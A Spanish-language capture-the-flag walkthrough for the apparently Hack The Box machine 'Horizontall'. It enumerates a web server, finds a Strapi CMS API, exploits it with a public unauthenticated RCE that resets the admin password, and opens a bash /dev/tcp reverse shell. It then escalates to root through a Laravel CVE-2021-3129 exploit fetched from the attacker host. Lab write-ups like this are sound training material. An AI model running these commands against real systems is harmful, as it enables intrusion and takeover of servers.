**Dificultad:** Easy 🟢  
**OS:** Linux 🐧
# Enumeración 🔎

## Puerto 80 (HTTP)

En este puerto corre un servicio HTTP que muestra una *landing page* estática en HTML. No encontramos funcionalidad explotable directa, por lo que procedemos a enumerar directorios.

```bash
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
```

La enumeración nos devuelve los siguientes directorios:
- img
- css
- js

Todos los directorios responden con **Forbidden**.

---

### Análisis del código fuente

Revisando el código fuente de la página principal encontramos una referencia a un script JavaScript:

```html
<link as="script" href="/js/app.c68eb462.js" rel="preload">
```

Analizando el contenido del script, buscamos rutas HTTP embebidas utilizando la siguiente cadena en Bash:

```bash
curl -s -X GET "http://horizontall.htb/js/app.c68eb462.js" | grep -oP '".*?"' | grep http | sort -u
```

Resultado:

```text
"http://api-prod.horizontall.htb/reviews"
"http://horizontall.htb/"
"http://www.w3.org/2000/svg"
```

Nos llama la atención el subdominio **api-prod.horizontall.htb**, el cual añadimos al archivo `/etc/hosts`.

---

## Enumeración de la API

Al acceder al subdominio observamos un mensaje de *Welcome*. Mediante la extensión **Wappalyzer** identificamos que el backend utiliza **Strapi CMS**.

Procedemos a enumerar los endpoints de la API:

```bash
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://api-prod.horizontall.htb/FUZZ"
```

Endpoints encontrados:
- users
- reviews
- admin

En el endpoint **/admin** encontramos el panel de autenticación de Strapi, pero no disponemos de credenciales.

---

## Búsqueda de vulnerabilidades

Buscamos exploits asociados a Strapi CMS:

```bash
searchsploit strapi
```

```text
Strapi 3.0.0-beta - Set Password (Unauthenticated)
Strapi 3.0.0-beta.17.7 - Remote Code Execution (Authenticated)
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (Unauthenticated)
```

Disponemos de dos exploits utilizables sin credenciales. Probamos el exploit para la versión **3.0.0-beta.17.4**.

---

# Explotación ⚔️

Descargamos el exploit:

```bash
searchsploit -m multiple/webapps/50239.py
```

Al inspeccionar el código observamos que se trata de un **Blind RCE**, lo cual no impide obtener una *reverse shell*.

Ejecutamos el exploit:

```bash
python3 50239.py http://api-prod.horizontall.htb
```

```text
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit

[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
```

---

## Obtención de Reverse Shell

Nos ponemos en escucha con netcat.

**Máquina atacante**:

```bash
nc -lvnp 9001
```

**Máquina víctima**:

```bash
bash -i >& /dev/tcp/IP/9001 0>&1
```

---

## User Flag 🏳️

La *user flag* se encuentra en:

```text
/home/developer/user.txt
```

---

## Root Flag 👑

Enumeramos los puertos abiertos en la máquina:

```bash
netstat -nat
```

```text
tcp   0   0 127.0.0.1:3306  LISTEN
tcp   0   0 0.0.0.0:80      LISTEN
tcp   0   0 0.0.0.0:22      LISTEN
tcp   0   0 127.0.0.1:1337  LISTEN
tcp   0   0 127.0.0.1:8000  LISTEN
```

El puerto **8000** nos resulta interesante. Al acceder mediante `curl` observamos que se trata de una aplicación **Laravel v8**.

Investigando vulnerabilidades conocidas descubrimos que puede ser vulnerable a **CVE-2021-3129**.

---

### Explotación de Laravel (CVE-2021-3129)

Usamos el siguiente exploit:
https://github.com/nth347/CVE-2021-3129_exploit

**Máquina atacante**:

```bash
git clone https://github.com/nth347/CVE-2021-3129_exploit.git
cd CVE-2021-3129_exploit
python3 -m http.server 5000
```

**Máquina víctima**:

```bash
wget http://IP_ATACANTE:5000/exploit.py
python3 exploit.py http://localhost:8000 Monolog/RCE1 whoami
```

```text
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] PHAR deserialized. Exploited

root
```

Con esto obtenemos ejecución de comandos como **root**.

La *root flag* se encuentra en:

```bash
/root/root.txt
```
